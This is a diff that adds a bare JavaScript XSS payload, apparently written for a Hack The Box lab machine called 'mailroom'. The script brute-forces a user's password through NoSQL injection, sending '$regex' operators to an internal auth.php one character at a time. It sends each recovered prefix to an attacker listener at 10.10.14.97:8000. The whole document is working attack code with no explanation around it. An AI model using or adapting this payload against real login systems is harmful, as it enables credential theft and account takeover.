@@ -1,0 +1,26 @@
+<script>
+let pwd = "";
+var charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!0123456789#@%";
+for (var j = 0; j < 20; j++){
+  for (var i = 0; i < charset.length; i++) {
+    var xhr1 = new XMLHttpRequest();
+    xhr1.open("post", "http://staff-review-panel.mailroom.htb/auth.php", false);
+    xhr1.onload = handleReq;
+    xhr1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr1.send("email=tristan@mailroom.htb&password[$regex]=^" + encodeURI(pwd + charset[i]) + ".*"); 
+    // doesn't exfil anything for matthew, users gotten from the git subdomain
+
+    function handleReq(){
+      var r1 = xhr1.responseText;
+      if (r1.includes("2FA")){
+        pwd += charset[i];
+        var xhr2 = new XMLHttpRequest();
+        xhr2.open("get", "http://10.10.14.97:8000/?p=" + encodeURI(pwd));
+        xhr2.send();
+      } 
+    }
+  }
+}
+</script>
+
+
